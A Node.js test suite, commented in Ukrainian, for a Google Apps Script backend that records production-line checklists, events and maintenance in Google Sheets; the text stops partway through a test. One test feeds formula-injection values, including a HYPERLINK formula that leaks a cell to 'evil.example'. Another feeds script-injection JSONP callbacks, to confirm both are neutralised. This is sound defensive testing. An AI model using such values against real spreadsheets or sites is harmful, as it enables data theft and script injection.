/* Тести сервера Apps Script (apps-script/Server.gs) над імітацією сервісів GAS (tools/gas-mock.mjs).
 * Core.gs (= assets/core.js) і Server.gs виконуються як у Apps Script: звичайні скрипти
 * в одному vm-контексті зі спільною глобальною областю.
 * Запуск: cd lines && node --test tests/server.test.mjs
 * Час «зараз» — 25.09.2026 06:00Z = 09:00 за Києвом (UTC+3). */
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { createGasMock, loadGasProject } from '../tools/gas-mock.mjs';
import LinesCore from './load-core.mjs';

const { SCHEMA, TABLES, LABELS } = LinesCore;
const NOW = '2026-09-25T06:00:00Z';
const MIN = 60e3, HOUR = 3600e3, DAY = 86400e3;
const J = (x) => JSON.parse(JSON.stringify(x));          // обʼєкти з vm-контексту → звичайні
const SERVER_SRC = readFileSync(fileURLToPath(new URL('../apps-script/Server.gs', import.meta.url)), 'utf8');

/* ------------------------------------------------------------------ фікстури */

function project(opts = {}) {
  const { ctx: G, inspect: I } = loadGasProject({ now: NOW, ...opts });
  const P = {
    G, I,
    get token() { return I.properties().API_TOKEN; },
    get pin() { return I.properties().ADMIN_PIN; },
    iso: (ms = 0) => new Date(I.clock.now().getTime() + ms).toISOString(),
    advance: (ms) => I.clock.advance(ms),
    post(req) {
      const out = G.doPost({ postData: { contents: JSON.stringify(req), type: 'text/plain' }, parameter: {} });
      assert.equal(out.getMimeType(), 'application/json');
      return JSON.parse(out.getContent());
    },
    call: (action, params = {}, device = 'Планшет лінії 1') => P.post({ action, token: P.token, device, ...params }),
    admin: (action, params = {}) => P.post({ action, token: P.token, device: 'Кабінет керівника', admin: P.pin, ...params }),
    ok(r) { assert.equal(r.ok, true, 'очікувався ok: ' + JSON.stringify(r).slice(0, 600)); return r; },
    save(table, row) { return P.ok(P.admin('save', { table, row })).row; },
    sheet: (table) => I.sheet(SCHEMA[table].sheet),
    rows: (table) => I.sheet(SCHEMA[table].sheet).records(),              // ключі — заголовки аркуша
    row: (table, id) => P.rows(table).find((r) => r.ID === id || r['Параметр'] === id),
    store: () => new G.SheetStore()
  };
  return P;
}
function ready(opts) {
  const P = project(opts);
  P.G.setup();
  return P;
}
function configure(P) {
  P.save('lines', { id: 'L1', name: 'Лінія фасування №1', kind: 'Фасувальна' });
  P.save('items', { id: 'I1', line_id: 'L1', occasions: 'start', section: 'Огляд', text: 'Огородження справні', type: 'check', critical: true });
  P.save('items', { id: 'I2', line_id: 'L1', occasions: 'start', section: 'Параметри', text: 'Тиск повітря, бар', type: 'number', unit_label: 'бар', min: 5.5, max: 7 });
  P.save('items', { id: 'I3', line_id: 'L1', occasions: 'end', section: 'Миття', text: 'Лінію промито', type: 'check' });
  P.save('meters', { id: 'M1', line_id: 'L1', name: 'Вироблено, шт', unit_label: 'шт', mode: 'inc', ask_on_end: true });
  P.save('rules', { id: 'R1', line_id: 'L1', title: 'ТО-1 фасувального автомата', work_type: 'to', interval_days: 30 });
  P.save('staff', { id: 'S1', name: 'Олена Коваленко', role: 'operator', line_ids: 'L1' });
}
const START_OK = [{ item_id: 'I1', value: 'ok' }, { item_id: 'I2', value: '6,2' }];
function wrongPin(pin, i) { return String((Number(pin) + i + 1) % 1e6).padStart(6, '0'); }

/* ================================================================== gas-mock */

describe('gas-mock: семантика Apps Script', () => {
  test('діапазони, розміри, порожній аркуш, невідомі методи', () => {
    const { globals: g, inspect: I } = createGasMock({ now: NOW });
    const ss = g.SpreadsheetApp.getActiveSpreadsheet();
    const sh = ss.insertSheet('Тест', 1);
    assert.equal(sh.getLastRow(), 0);
    assert.equal(sh.getLastColumn(), 0);
    assert.throws(() => sh.getRange(1, 1, 0, 1), /at least 1/);
    assert.throws(() => sh.getRange(1, 1, 1, 0), /at least 1/);
    assert.throws(() => sh.getRange(0, 1), /too small/);
    assert.throws(() => sh.getRange(1000, 1, 2, 1), /outside the dimensions/);
    assert.throws(() => sh.getRange(1, 1, 2, 2).setValues([[1, 2]]), /number of rows/);
    assert.throws(() => sh.getRange(1, 1, 1, 2).setValues([[1]]), /number of columns/);
    assert.deepEqual(sh.getRange(1, 1, 1, 2).getValues(), [['', '']]);
    assert.throws(() => sh.appendRow(['x']), /not implemented in mock/);
    assert.throws(() => g.SpreadsheetApp.openByUrl('x'), /not implemented in mock/);
    assert.throws(() => g.SpreadsheetApp.getUi(), /Cannot call SpreadsheetApp.getUi\(\)/);
    sh.insertRowsAfter(1000, 5);
    assert.equal(sh.getMaxRows(), 1005);
    assert.equal(I.sheetNames().join('|'), 'Аркуш1|Тест');
  });

  test('введення як у Sheets: формули, апостроф, числа, дати, логічні', () => {
    const { globals: g, inspect: I } = createGasMock({ now: NOW });
    const sh = g.SpreadsheetApp.getActiveSpreadsheet().getSheets()[0];
    const d = new Date('2026-09-25T10:00:00Z');
    sh.getRange(1, 1, 1, 12).setValues([['=1+1', '\'=1+1', '007', '5,5', '-3', '25.09.2026', '2026-09-25 08:30', '12:30', 'TRUE', d, true, '- пункт']]);
    const v = sh.getRange(1, 1, 1, 12).getValues()[0];
    assert.equal(v[0], '#ERROR!');
    assert.equal(v[1], '=1+1');
    assert.equal(v[2], 7);
    assert.equal(v[3], 5.5);
    assert.equal(v[4], -3);
    assert.equal(v[5].toISOString(), '2026-09-24T21:00:00.000Z');       // північ за Києвом
    assert.equal(v[6].toISOString(), '2026-09-25T05:30:00.000Z');
    assert.ok(v[7] instanceof Date);
    assert.equal(v[8], true);
    assert.equal(v[9].getTime(), d.getTime());
    assert.equal(v[10], true);
    assert.equal(v[11], '#ERROR!');
    assert.deepEqual(I.formulas.map((f) => f.formula), ['=1+1', '=- пункт']);
    assert.equal(sh.getRange(1, 1, 1, 2).getFormulas()[0][0], '=1+1');
    assert.equal(sh.getRange(1, 1, 1, 2).getFormulas()[0][1], '');
    // прапорець робить порожні клітинки FALSE
    sh.getRange(3, 1, 2, 1).setDataValidation(g.SpreadsheetApp.newDataValidation().requireCheckbox().build());
    assert.equal(sh.getLastRow(), 4);
  });

  test('Utilities, Cache, Lock, тригери, годинник', () => {
    const { globals: g, inspect: I } = createGasMock({ now: NOW });
    const U = g.Utilities;
    assert.equal(U.formatDate(new Date('2026-03-29T00:30:00Z'), 'Europe/Kyiv', 'yyyy-MM-dd HH:mm Z'), '2026-03-29 02:30 +0200');
    assert.equal(U.formatDate(new Date('2026-03-29T01:30:00Z'), 'Europe/Kyiv', 'yyyy-MM-dd HH:mm Z'), '2026-03-29 04:30 +0300');
    assert.equal(U.formatDate(new Date('2026-09-25T06:00:00Z'), 'Mars/Base', 'HH:mm Z'), '06:00 +0000');    // як у Java: GMT
    assert.equal(U.parseDate('2026-10-25 00:00:00', 'Europe/Kyiv', 'yyyy-MM-dd HH:mm:ss').toISOString(), '2026-10-24T21:00:00.000Z');
    assert.throws(() => U.formatDate(new Date(), 'UTC', 'yyyy QQ'), /not implemented in mock/);
    assert.match(U.getUuid(), /^[0-9a-f-]{36}$/);
    const c = g.CacheService.getScriptCache();
    c.put('k', 'v', 60);
    assert.equal(c.get('k'), 'v');
    I.clock.advance(61e3);
    assert.equal(c.get('k'), null);
    const lock = g.LockService.getScriptLock();
    I.lock.hold();
    assert.equal(lock.tryLock(1000), false);
    assert.throws(() => lock.waitLock(1000), /Lock timeout/);
    I.lock.release();
    assert.equal(lock.tryLock(1000), true);
    assert.equal(I.lock.held(), true);
    lock.releaseLock();
    assert.equal(I.lock.held(), false);
    assert.throws(() => g.ScriptApp.newTrigger('f').timeBased().atHour(7).create(), /exactly one schedule/);
    assert.throws(() => g.ScriptApp.newTrigger('f').timeBased().everyHours(3), /one of 1, 2, 4/);
    g.ScriptApp.newTrigger('f').timeBased().atHour(7).everyDays(1).inTimezone('Europe/Kyiv').create();
    assert.equal(I.triggers()[0].atHour, 7);
    assert.equal(new g.Date().toISOString(), new Date(Date.parse(NOW) + 61e3).toISOString());
    assert.equal(g.Date.now(), Date.parse(NOW) + 61e3);
  });
});

/* ================================================================== setup */

describe('setup()', () => {
  test('аркуші в порядку TABLES, заголовки, оформлення, налаштування, секрети, тригери', () => {
    const P = project({ spreadsheetTz: 'America/New_York' });
    const r = J(P.G.setup());
    assert.equal(r.ok, true);
    const names = TABLES.map((t) => SCHEMA[t].sheet);
    assert.deepEqual(P.I.sheetNames(), names, 'порожній «Аркуш1» видалено, решта — у порядку TABLES');
    assert.equal(r.removed_sheet, 'Аркуш1');
    for (const t of TABLES) {
      const sh = P.sheet(t);
      assert.deepEqual(sh.header(), SCHEMA[t].cols.map((c) => c.t), t);
      assert.equal(sh.frozenRows, 1, t);
      assert.equal(sh.styleAt(1, 1, 'fontWeight'), 'bold', t);
      SCHEMA[t].cols.forEach((c, i) => {
        const col = i + 1;
        if (c.service) {
          assert.equal(sh.styleAt(1, col, 'background'), '#d9d9d9', t + '.' + c.k);
          assert.match(sh.noteAt(1, col), /Службовий стовпець/);
        }
        if (c.base === 'date') assert.match(sh.formatAt(2, col), /^dd\.MM\.yyyy/, t + '.' + c.k);
        if (c.base === 'enum') {
          const v = sh.validationAt(5, col);
          assert.equal(v.type, 'VALUE_IN_LIST', t + '.' + c.k);
          assert.deepEqual(v.values, Object.values(LABELS[c.set]));
          assert.equal(v.allowInvalid, true);
        }
      });
    }
    assert.equal(P.sheet('events').noteAt(1, 1).includes('анулюйте'), true);
    assert.match(P.sheet('staff').noteAt(1, P.sheet('staff').col('PIN')), /хеш/);
    // налаштування: усі несервісні ключі + sheet_url, з описом
    const st = P.rows('settings');
    const keys = st.map((x) => x['Параметр']);
    assert.deepEqual(keys, LinesCore.SETTINGS_META.map((m) => m.key));
    assert.ok(st.every((x) => x['Опис']));
    assert.equal(P.row('settings', 'digest_hour')['Значення'], '7', 'число як текст (апостроф)');
    assert.equal(P.row('settings', 'instant_due')['Значення'], 'так');
    assert.equal(P.row('settings', 'sheet_url')['Значення'], P.I.spreadsheet.url);
    // секрети
    assert.match(P.token, /^[A-Za-z0-9]{24}$/);
    assert.match(P.pin, /^\d{6}$/);
    // тригери
    const tr = P.I.triggers();
    assert.equal(tr.length, 2);
    const daily = tr.find((x) => x.handler === 'dailyJob'), hourly = tr.find((x) => x.handler === 'hourlyJob');
    assert.equal(daily.atHour, 7);
    assert.equal(daily.everyDays, 1);
    assert.equal(daily.tz, 'Europe/Kyiv');
    assert.equal(hourly.everyHours, 1);
    assert.equal(P.I.spreadsheet.timeZone(), 'Europe/Kyiv');
    // без UI — повідомлення в журнал виконання, а не виняток
    assert.ok(P.I.logs.some((l) => /Готово/.test(l.text)));
  });

  test('повторний запуск — ідемпотентний; правки в таблиці зберігаються', () => {
    const P = ready();
    const token = P.token, pin = P.pin;
    const S = P.sheet('settings');
    S.type(2, S.col('Значення'), 'ТОВ «Смак»');            // company
    S.raw(4, S.col('Опис'), '');                           // опис manager_emails стерто
    const r = J(P.G.setup());
    assert.deepEqual(r.created, []);
    assert.equal(r.settings_added, 0);
    assert.deepEqual(r.generated, []);
    assert.equal(P.token, token);
    assert.equal(P.pin, pin);
    assert.equal(P.I.triggers().length, 2);
    assert.equal(P.rows('settings').length, LinesCore.SETTINGS_META.length);
    assert.equal(P.row('settings', 'company')['Значення'], 'ТОВ «Смак»');
    assert.ok(P.rows('settings')[2]['Опис'], 'порожній опис доповнено');
    TABLES.forEach((t) => assert.equal(P.sheet(t).header().length, SCHEMA[t].cols.length, t));
  });

  test('меню onOpen і повідомлення в UI', () => {
    const P = project({ ui: true });
    P.G.onOpen({});
    const m = P.I.ui.menus[0];
    assert.equal(m.caption, 'Облік ліній');
    const items = m.items.filter((x) => !x.separator);
    assert.deepEqual(items.map((x) => x.caption), ['Початкове налаштування', 'Заповнити демо-даними', 'Надіслати звіт зараз',
      'Перевірити строки ТО зараз', 'Оновити «План ППР»', 'Перерахувати мотогодини', 'Показати токен і PIN']);
    items.forEach((x) => assert.equal(typeof P.G[x.fn], 'function', x.fn));
    P.G.setup();
    assert.equal(P.I.ui.alerts[0].title, 'Початкове налаштування');
    const s = J(P.G.showSecrets());
    assert.equal(s.token, P.token);
    assert.ok(P.I.ui.alerts[1].prompt.includes(P.token) && P.I.ui.alerts[1].prompt.includes(P.pin));
    assert.ok(P.I.ui.alerts[1].prompt.includes('https://script.google.com/'));
  });

  test('onOpen без UI не кидає; showSecrets до налаштування', () => {
    const P = project();
    P.G.onOpen({});
    const s = J(P.G.showSecrets());
    assert.equal(s.ok, false);
    assert.match(s.message, /Початкове налаштування/);
  });
});

/* ================================================================== HTTP */

describe('HTTP: doGet / doPost, токен', () => {
  test('ping без токена — лише {ok, version}; з токеном — повна відповідь', () => {
    const P = ready();
    assert.deepEqual(P.post({ action: 'ping' }), { ok: true, version: LinesCore.VERSION });
    assert.deepEqual(P.post({ action: 'ping', token: 'wrong' }), { ok: true, version: LinesCore.VERSION });
    const r = P.ok(P.call('ping'));
    assert.equal(r.company, 'Foodline Production');
    assert.equal(r.server, '1.0.0');
    assert.equal(r.now, new Date(NOW).toISOString());
  });

  test('BAD_TOKEN: без токена, невірний, токен не налаштовано', () => {
    const P = ready();
    assert.equal(P.post({ action: 'bootstrap' }).error, 'BAD_TOKEN');
    assert.equal(P.post({ action: 'bootstrap', token: P.token + 'x' }).error, 'BAD_TOKEN');
    assert.equal(P.post({ action: 'event', token: ' ' }).error, 'BAD_TOKEN');
    assert.equal(P.post({ action: 'bootstrap', token: P.token }).ok, true);
    const Q = project();
    const r = Q.post({ action: 'bootstrap', token: '' });
    assert.equal(r.error, 'BAD_TOKEN');
    assert.equal(r.message, LinesCore.ERR_MSG.BAD_TOKEN);
  });

  test('без Core.gs — зрозуміла помилка JSON, а не виняток', () => {
    const { ctx } = loadGasProject({ now: NOW, files: [{ source: SERVER_SRC, name: 'Server.gs' }] });
    const r = JSON.parse(ctx.doPost({ postData: { contents: '{"action":"ping"}' }, parameter: {} }).getContent());
    assert.equal(r.error, 'SERVER_ERROR');
    assert.match(r.message, /Core\.gs/);
  });

  test('doPost: невірний JSON → BAD_REQUEST; параметри URL доповнюють тіло', () => {
    const P = ready();
    const bad = JSON.parse(P.G.doPost({ postData: { contents: '{oops' }, parameter: {} }).getContent());
    assert.equal(bad.error, 'BAD_REQUEST');
    const r = JSON.parse(P.G.doPost({ postData: { contents: JSON.stringify({ token: P.token }) }, parameter: { action: 'ping' } }).getContent());
    assert.equal(r.company, 'Foodline Production');
  });

  test('doGet: JSON, payload, JSONP з перевіркою callback; запис через JSONP (резервний канал клієнта)', () => {
    const P = ready();
    configure(P);
    const g = P.G.doGet({ parameter: { action: 'bootstrap', token: P.token } });
    assert.equal(g.getMimeType(), 'application/json');
    assert.deepEqual(JSON.parse(g.getContent()).lines.map((l) => l.id), ['L1']);
    const h = JSON.parse(P.G.doGet({ parameter: { action: 'history', token: P.token, payload: JSON.stringify({ types: ['checks'], limit: 5 }) } }).getContent());
    assert.equal(h.ok, true);
    assert.deepEqual(h.events, []);
    const j = P.G.doGet({ parameter: { action: 'ping', token: P.token, callback: 'fl_cb$1' } });
    assert.equal(j.getMimeType(), 'application/javascript');
    const m = /^\/\*\*\/fl_cb\$1\((.*)\);$/s.exec(j.getContent());
    assert.ok(m, j.getContent());
    assert.equal(JSON.parse(m[1]).ok, true);
    for (const cb of ['alert(1)//', 'a.b', '1abc', 'x'.repeat(65), '<script>']) {
      const bad = P.G.doGet({ parameter: { action: 'ping', callback: cb } });
      assert.equal(bad.getMimeType(), 'application/json', cb);
      assert.ok(!bad.getContent().includes(cb), 'callback не повертається: ' + cb);
      assert.equal(JSON.parse(bad.getContent()).error, 'BAD_REQUEST');
    }
    const badPayload = JSON.parse(P.G.doGet({ parameter: { action: 'bootstrap', token: P.token, payload: '[1' } }).getContent());
    assert.equal(badPayload.error, 'BAD_REQUEST');
    // як api.js: action і token — у запиті, решта — у payload; пакет записів
    const ops = [{ op_id: 'o1', action: 'event', id: 'g1', ts: P.iso(-MIN), line_id: 'L1', state: 'run' }];
    const jw = P.G.doGet({ parameter: { action: 'batch', token: P.token, callback: '__flj1abc2',
      payload: JSON.stringify({ device: 'Планшет', ops }), _: 'x1' } });
    const w = JSON.parse(/^\/\*\*\/__flj1abc2\((.*)\);$/s.exec(jw.getContent())[1]);
    assert.equal(w.ok, true);
    assert.equal(w.results[0].ok, true);
    assert.equal(P.row('events', 'g1')['Пристрій'], 'Планшет');
    assert.equal(P.I.lock.held(), false);
  });

  test('bootstrap на порожніх аркушах і навіть без аркушів', () => {
    const P = ready();
    const b = P.ok(P.call('bootstrap'));
    assert.deepEqual([b.lines, b.units, b.items, b.meters, b.rules, b.staff, b.due], [[], [], [], [], [], [], []]);
    assert.deepEqual(b.status, {});
    assert.equal(b.settings.company, 'Foodline Production');
    assert.equal(b.settings.manager_emails, undefined, 'адмінські налаштування — лише керівнику');
    const Q = project();
    Q.G.PropertiesService.getScriptProperties().setProperty('API_TOKEN', 'T0KEN-1234567890');
    const r = Q.post({ action: 'bootstrap', token: 'T0KEN-1234567890' });
    assert.equal(r.ok, true);
    assert.deepEqual(Q.I.sheetNames(), ['Аркуш1'], 'читання не створює аркушів');
  });
});

/* ================================================================== робота оператора */

describe('повний сценарій оператора', () => {
  test('чек-лист запуску → робота → простій → ТО → завершення з показником → не працює', () => {
    const P = ready();
    configure(P);
    const c1 = P.ok(P.call('checklist', {
      id: 'c1', ts: P.iso(), started: P.iso(-10 * MIN), line_id: 'L1', occasion: 'start', operator: 'Олена Коваленко',
      staff_id: 'S1', product: 'Кетчуп «Лагідний» 300 г', answers: START_OK, then_event: { id: 'e1', state: 'run' }
    }));
    assert.equal(c1.check.result, 'ok');
    assert.equal(c1.status.state, 'run');
    let ev = P.row('events', 'e1');
    assert.equal(ev['Стан'], 'Працює');
    assert.equal(ev['Попередній стан'], 'Не працює');
    assert.equal(ev['Повʼязаний запис'], 'c1');
    assert.equal(ev['Позначка'], '');
    assert.equal(ev['Продукт / формат'], 'Кетчуп «Лагідний» 300 г');
    assert.equal(ev['Пристрій'], 'Планшет лінії 1');
    assert.ok(ev['Час'] instanceof Date);
    assert.equal(ev['Час'].toISOString(), new Date(NOW).toISOString());
    assert.equal(ev['Анульовано'], false);
    const ch = P.row('checks', 'c1');
    assert.equal(ch['Коли'], 'Запуск');
    assert.equal(ch['Результат'], 'Норма');
    assert.equal(ch['Пунктів'], 2);
    const ans = P.rows('answers').filter((a) => a['ID чек-листа'] === 'c1');
    assert.equal(ans.length, 2);
    const a2 = ans.find((a) => a['ID пункту'] === 'I2');
    assert.equal(a2['Значення'], '6,2', 'текст, не число');
    assert.equal(a2['Числове значення'], 6.2);
    assert.equal(a2['Тип'], 'Число');
    assert.equal(a2['В нормі'], true);

    P.advance(2 * HOUR);
    P.ok(P.call('event', { id: 'e2', ts: P.iso(), line_id: 'L1', state: 'stop', reason: 'Очікування', operator: 'Олена Коваленко' }));
    assert.equal(P.row('events', 'e2')['Стан'], 'Простій');
    assert.equal(P.row('events', 'e2')['Мотогодини лінії'], 2);
    P.advance(20 * MIN);
    P.ok(P.call('event', { id: 'e3', ts: P.iso(), line_id: 'L1', state: 'run' }));
    P.advance(HOUR);
    const w = P.ok(P.call('work', { id: 'w1', ts: P.iso(), line_id: 'L1', rule_id: 'R1', work_type: 'to', title: 'ТО-1 виконано',
      performer: 'Віктор Мельник', duration_min: 30 }));
    assert.equal(w.due.status, 'ok');
    const wr = P.row('works', 'w1');
    assert.equal(wr['Вид'], 'ТО');
    assert.equal(wr['Статус'], 'Виконано');
    assert.equal(wr['Мотогодини лінії'], 3);
    assert.equal(wr['Тривалість, хв'], 30);
    const rule = P.row('rules', 'R1');
    assert.equal(rule['ID останньої роботи'], 'w1');
    assert.equal(rule['Останнє виконання'].toISOString(), P.iso());

    P.advance(3 * HOUR);
    const c2 = P.ok(P.call('checklist', {
      id: 'c2', ts: P.iso(), line_id: 'L1', occasion: 'end', operator: 'Олена Коваленко', staff_id: 'S1',
      answers: [{ item_id: 'I3', value: 'ok' }], readings: [{ meter_id: 'M1', value: 1500 }], then_event: { id: 'e4', state: 'off' }
    }));
    assert.equal(c2.status.state, 'off');
    assert.equal(P.row('events', 'e4')['Стан'], 'Не працює');
    assert.equal(P.row('events', 'e4')['Позначка'], '');
    const rd = P.rows('readings')[0];
    assert.equal(rd['Значення'], 1500);
    assert.equal(rd['Тип обліку'], 'Приріст за зміну');
    assert.equal(rd['ID події'], 'e4');
    assert.equal(P.row('meters', 'M1')['Поточне значення'], 1500);
    const line = P.row('lines', 'L1');
    assert.equal(line['Поточний стан'], 'Не працює');
    assert.equal(line['Мотогодини на момент події'], 6);
    assert.equal(line['Запусків усього'], 1);
    assert.equal(line['ID останньої події'], 'e4');
    assert.equal(line['Поточний оператор'], 'Олена Коваленко');

    const b = P.ok(P.call('bootstrap'));
    assert.equal(b.status.L1.state, 'off');
    assert.equal(b.status.L1.cum_h, 6);
    assert.equal(b.status.L1.starts, 1);
    assert.equal(b.due[0].rule_id, 'R1');
    assert.equal(b.due[0].status, 'ok');
    const lv = P.ok(P.call('line', { line_id: 'L1', days: 2 }));
    assert.deepEqual(lv.events.map((e) => e.id), ['e4', 'e3', 'e2', 'e1']);
    const cd = P.ok(P.call('check_detail', { id: 'c1' }));
    assert.equal(cd.answers.length, 2);
    // анулювання (керівник) → «Анульовано» = true
    P.ok(P.admin('void', { table: 'works', id: 'w1', note: 'Помилковий запис' }));
    assert.equal(P.row('works', 'w1')['Анульовано'], true);
    assert.equal(P.row('works', 'w1')['Причина анулювання'], 'Помилковий запис');
    assert.equal(P.row('rules', 'R1')['ID останньої роботи'], '');
    assert.equal(P.I.lock.held(), false, 'блокування звільнено');
  });

  test('batch: дублікати, помилкова операція не зупиняє інші, повтор пакета нічого не дублює', () => {
    const P = ready();
    configure(P);
    const ops = [
      { op_id: 1, action: 'event', id: 'b1', ts: P.iso(), line_id: 'L1', state: 'run' },
      { op_id: 2, action: 'event', id: 'b1', ts: P.iso(), line_id: 'L1', state: 'run' },
      { op_id: 3, action: 'event', id: 'b3', ts: P.iso(), line_id: 'NOPE', state: 'stop' },
      { op_id: 4, action: 'reading', id: 'b4', meter_id: 'M1', value: 'abc' },
      { op_id: 5, action: 'nope' },
      { op_id: 6, action: 'save', table: 'lines', row: { name: 'X' } },
      { op_id: 7, action: 'event', id: 'b7', ts: P.iso(MIN), line_id: 'L1', state: 'stop', reason: 'Перерва' }
    ];
    const r = P.ok(P.call('batch', { ops }));
    const res = r.results;
    assert.deepEqual(res.map((x) => x.op_id), [1, 2, 3, 4, 5, 6, 7]);
    assert.equal(res[0].ok, true);
    assert.equal(res[0].data.event.flag, 'no_checklist');
    assert.equal(res[1].duplicate, true);
    assert.equal(res[2].error, 'NOT_FOUND');
    assert.equal(res[3].error, 'BAD_REQUEST');
    assert.equal(res[4].error, 'UNKNOWN_ACTION');
    assert.equal(res[5].error, 'ADMIN_REQUIRED');
    assert.equal(res[6].ok, true);
    const ids = () => P.rows('events').map((e) => e.ID);
    assert.deepEqual(ids(), ['b1', 'b7']);
    assert.equal(P.row('events', 'b1')['Позначка'], 'Запуск без чек-листа');
    const again = P.ok(P.call('batch', { ops }));
    assert.equal(again.results[0].duplicate, true);
    assert.equal(again.results[6].duplicate, true);
    assert.deepEqual(ids(), ['b1', 'b7']);
    assert.equal(P.call('batch', { ops: 'x' }).error, 'BAD_REQUEST');
  });
});

/* ================================================================== захист значень */

describe('значення в клітинках: формули й автоперетворення', () => {
  test('формули не виконуються; "007", дати, час, TRUE лишаються текстом', () => {
    const P = ready();
    configure(P);
    const evil = {
      operator: '=HYPERLINK("http://evil.example/?"&A1,"натисни")',
      reason: '-2+3',
      product: '+380501234567',
      note: '@SUM(A1:A9)'
    };
    P.ok(P.call('event', { id: 'x1', ts: P.iso(-30 * MIN), line_id: 'L1', state: 'stop', ...evil }));
    const tricky = ['007', '25.09.2026', '2026-09-25', '12:30', 'TRUE', '\'апостроф', '#N/A', '5,5', '1e5', '50%'];
    tricky.forEach((s, i) => P.ok(P.call('event', { id: 'y' + i, ts: P.iso((i - 20) * MIN), line_id: 'L1', state: 'stop', reason: s, note: s })));
    P.save('staff', { id: 'S7', name: '007', role: 'operator', email: 'x@example.com' });
    P.save('lines', { id: 'L9', name: '=1+1', kind: '12:30', area: 'TRUE', description: '0012' });
    assert.deepEqual(P.I.formulas, [], 'жодної формули в таблиці');
    TABLES.forEach((t) => assert.deepEqual(P.sheet(t).formulas(), [], t));
    const x1 = P.row('events', 'x1');
    for (const [k, h] of [['operator', 'Оператор'], ['reason', 'Причина'], ['product', 'Продукт / формат'], ['note', 'Примітка']]) {
      assert.equal(x1[h], evil[k], h);
    }
    tricky.forEach((s, i) => {
      const r = P.row('events', 'y' + i);
      assert.equal(typeof r['Причина'], 'string', s);
      assert.equal(r['Причина'], s);
      assert.equal(r['Примітка'], s);
    });
    assert.equal(P.row('staff', 'S7')['ПІБ'], '007');
    const l9 = P.row('lines', 'L9');
    assert.deepEqual([l9['Назва'], l9['Тип'], l9['Дільниця'], l9['Опис']], ['=1+1', '12:30', 'TRUE', '0012']);
    assert.equal(P.row('lines', 'L1')['Поточний оператор'], evil.operator, 'службовий стовпець (update) — теж текстом');
    const h = P.ok(P.call('history', { types: 'events' }));
    const back = Object.fromEntries(h.events.map((e) => [e.id, e]));
    assert.equal(back.x1.operator, evil.operator);
    tricky.forEach((s, i) => assert.equal(back['y' + i].reason, s));
    const b = P.ok(P.admin('bootstrap'));
    assert.equal(b.staff.find((s) => s.id === 'S7').name, '007');
    assert.equal(b.lines.find((l) => l.id === 'L9').name, '=1+1');
  });
});

/* ================================================================== правки людей у таблиці */

describe('правки керівника прямо в таблиці', () => {
  test('переставлені стовпці, чужий стовпець, мітки, «так», «5,5», ДД.ММ.РРРР, рядки без ID', () => {
    const P = ready();
    configure(P);
    const L = P.sheet('lines');
    // «Назва» — у кінець, новий стовпець «Коментар керівника» — між службовими стовпцями
    L.moveColumn(L.col('Назва'), L.lastColumn);
    L.insertColumnBefore(L.col('Стан з'));
    L.type(1, L.col('Стан з') - 1, 'Коментар керівника');
    const note = L.col('Коментар керівника');
    L.type(2, note, 'перевірити датчик');
    // людина додає лінію L2 і рядок без ID
    const h = L.header();
    const put = (r, title, v) => L.type(r, h.indexOf(title) + 1, v);
    put(3, 'ID', 'L2'); put(3, 'Назва', 'Лінія 2 (з таблиці)'); put(3, 'Тип', 'Етикетувальна');
    put(3, 'Активна', 'так'); put(3, 'Порядок', '5,5'); put(3, 'Створено', '01.09.2026');
    L.type(3, note, '=1+1');                                       // формула в чужому стовпці
    put(4, 'Назва', 'Лінія без ID'); put(4, 'Активна', 'так');
    // пункт чек-листа з мітками; заголовок «Обовʼязковий» людина переписала з простим апострофом
    const IT = P.sheet('items');
    IT.raw(1, IT.col('Обовʼязковий'), 'Обов\'язковий');
    const ih = IT.header(), iput = (title, v) => IT.type(5, ih.indexOf(title) + 1, v);
    iput('ID', 'I9'); iput('ID лінії', 'L2'); iput('Коли', 'Запуск, Переналаштування'); iput('Розділ', 'Параметри');
    iput('Пункт / параметр', 'Температура продукту, °C'); iput('Тип', 'Число'); iput('Мін', '\'5,5'); iput('Макс', '30');
    iput('Обов\'язковий', 'так'); iput('Критичний', 'ні'); iput('Активний', 'Так');
    // регламент: вид міткою, дата відліку — введена датою і текстом
    const RL = P.sheet('rules'), rh = RL.header();
    const rput = (r, title, v) => RL.type(r, rh.indexOf(title) + 1, v);
    rput(3, 'ID', 'R9'); rput(3, 'ID лінії', 'L2'); rput(3, 'Робота', 'Огляд етикетувальника'); rput(3, 'Вид', 'огляд / діагностика');
    rput(3, 'Інтервал, днів', '10'); rput(3, 'Відлік від дати', '01.09.2026'); rput(3, 'Активний', 'так');
    rput(4, 'ID', 'R10'); rput(4, 'ID лінії', 'L2'); rput(4, 'Робота', 'Чистка датера'); rput(4, 'Вид', 'Миття / санобробка');
    rput(4, 'Інтервал, днів', '3'); RL.raw(4, rh.indexOf('Відлік від дати') + 1, '15.09.2026 08:00'); rput(4, 'Активний', 'так');
    // робота, внесена в журнал вручну
    const W = P.sheet('works'), wh = W.header(), wput = (title, v) => W.type(2, wh.indexOf(title) + 1, v);
    wput('ID', 'hw1'); wput('Завершено', '24.09.2026 14:30'); wput('ID лінії', 'L1'); wput('Вид', 'Ремонт');
    wput('Що зроблено', 'Заміна ременя конвеєра'); wput('Статус', 'Виконано');

    const b = P.ok(P.admin('bootstrap'));
    const l2 = b.lines.find((l) => l.id === 'L2');
    assert.equal(l2.name, 'Лінія 2 (з таблиці)');
    assert.equal(l2.kind, 'Етикетувальна');
    assert.equal(l2.active, true);
    assert.equal(l2.sort, 5.5);
    assert.equal(l2.created, '2026-08-31T21:00:00.000Z');
    assert.equal(b.lines.find((l) => l.id === 'L1').name, 'Лінія фасування №1');
    assert.deepEqual(b.config_issues.map((x) => [x.table, x.problem, x.name]), [['lines', 'no_id', 'Лінія без ID']]);
    const i9 = b.items.find((i) => i.id === 'I9');
    assert.deepEqual(i9.occasions, ['start', 'changeover']);
    assert.equal(i9.type, 'number');
    assert.equal(i9.min, 5.5);
    assert.equal(i9.max, 30);
    assert.equal(i9.required, true);
    assert.equal(i9.critical, false);
    const r9 = b.rules.find((r) => r.id === 'R9'), r10 = b.rules.find((r) => r.id === 'R10');
    assert.equal(r9.work_type, 'inspect');
    assert.equal(r9.base_date, '2026-08-31T21:00:00.000Z');
    assert.equal(r10.work_type, 'clean');
    assert.equal(r10.base_date, '2026-09-15T05:00:00.000Z');
    assert.equal(b.due.find((d) => d.rule_id === 'R9').status, 'due');
    const hist = P.ok(P.call('history', { types: ['works'] }));
    assert.equal(hist.works[0].id, 'hw1');
    assert.equal(hist.works[0].work_type, 'repair');
